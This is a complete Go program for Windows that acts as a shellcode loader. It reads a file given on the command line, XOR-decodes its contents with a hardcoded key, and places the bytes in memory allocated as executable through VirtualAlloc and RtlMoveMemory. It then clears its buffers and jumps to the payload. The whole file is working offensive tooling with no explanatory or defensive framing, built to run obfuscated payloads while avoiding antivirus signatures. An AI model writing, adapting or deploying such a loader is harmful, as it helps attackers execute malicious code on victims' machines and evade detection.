package main

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
	//"net/http"
	"log"
	//"os/exec"
	"strings"
	"encoding/hex"
	"strconv"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	ntdll              = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
	// RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}
var XorKey []byte = []byte{0x12, 0x34, 0x67, 0x6A, 0xA1, 0xFF, 0x04, 0x7B}

type Xor struct {
}

type m interface {
	enc(src string) string
	dec(src string) string
}

func (a *Xor) dec(src string) string {
	var result string
	var s int64
	j := 0
	bt := []rune(src)
	//fmt.Println(bt)
	for i := 0; i < len(src)/2; i++ {
		s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
		result = result + string(byte(s)^XorKey[j])
		j = (j + 1) % 8
	}
	return result
}

func main() {
	xor := Xor{}


	var charcode []byte
	fileObj, err := os.Open(os.Args[1]);
	bodyBytes, err := ioutil.ReadAll(fileObj)
	if err != nil {
		log.Fatal(err)
	}
	charcode = bodyBytes

	shellcodes := strings.ReplaceAll(string(bodyBytes), "\n", "")
	shellcodes = strings.ReplaceAll(string(shellcodes), "\\x", "")
	xorCode1 := xor.dec(shellcodes)
	charcode,_ = hex.DecodeString(xorCode1)

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkErr(err)

	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}
	for j := 0; j < len(bodyBytes); j++ {
		bodyBytes[j] = 0
	}
	shellcodes = ""

	syscall.Syscall(addr, 0, 0, 0, 0)
}